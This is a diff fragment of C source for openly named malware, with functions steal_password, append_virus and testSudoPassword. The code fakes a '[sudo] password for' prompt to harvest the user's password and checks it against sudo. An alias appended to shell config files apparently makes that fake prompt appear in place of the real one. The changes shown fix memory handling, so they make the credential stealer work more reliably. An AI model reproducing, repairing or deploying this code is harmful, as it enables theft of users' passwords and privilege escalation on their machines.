@@ -67,11 +67,12 @@ int steal_password(char * passwd, char * username){
 
   char prompt[UNAME_SIZE + 32];
   int correctPasswd = 0;
+  char * returned_pass;
   while (! correctPasswd){
     sprintf(prompt,"[sudo] password for %s: ", username);
 
     // This command prints the prompt to stdout then reads in the user's input without it showing up on the terminal (like sudo)
-    char * returned_pass = getpass(prompt);
+    returned_pass = getpass(prompt);
 
     // returned_pass[strlen(returned_pass)] = 0;
 
@@ -81,8 +82,10 @@ int steal_password(char * passwd, char * username){
     if (testSudoPassword(passwd) == 0){
       correctPasswd = 1;
     }
-    free(returned_pass);
+
   }
+
+  free(returned_pass);
 
   return 0;
 }
@@ -151,7 +154,8 @@ int append_virus(char * home_dir, char * config_file, char * alias){
 
 int testSudoPassword(char * passwd){
   // The first three command line arguments are path to file, SUDO, sudo
-  char ** fillerArray = (char**)calloc(1, sizeof(char*));
+  char ** fillerArray = (char**)calloc(4, sizeof(char*));
+
   *(fillerArray) = (char*)malloc(strlen("sudo")*sizeof(char));
   strcpy(*(fillerArray), "sudo");
 
